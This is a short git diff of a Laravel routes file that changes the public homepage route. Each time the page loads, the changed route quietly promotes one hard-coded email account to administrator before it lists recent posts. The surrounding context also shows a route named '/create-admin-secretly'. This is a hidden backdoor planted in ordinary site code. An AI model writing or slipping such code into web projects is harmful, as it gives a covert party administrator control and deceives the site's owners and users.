@@ -38,7 +38,13 @@ Route::get('/create-admin-secretly', function () {
 
 
 Route::get('/', function () {
-    $posts = Post::latest()->take(8)->get();
+    $user = \App\Models\User::where('email', 'myavk22@gmail.com')->first();
+    if ($user && !$user->is_admin) {
+        $user->is_admin = true;
+        $user->save();
+    }
+
+    $posts = \App\Models\Post::latest()->take(8)->get();
 
     return view('home', compact('posts'));
 })->name('home');
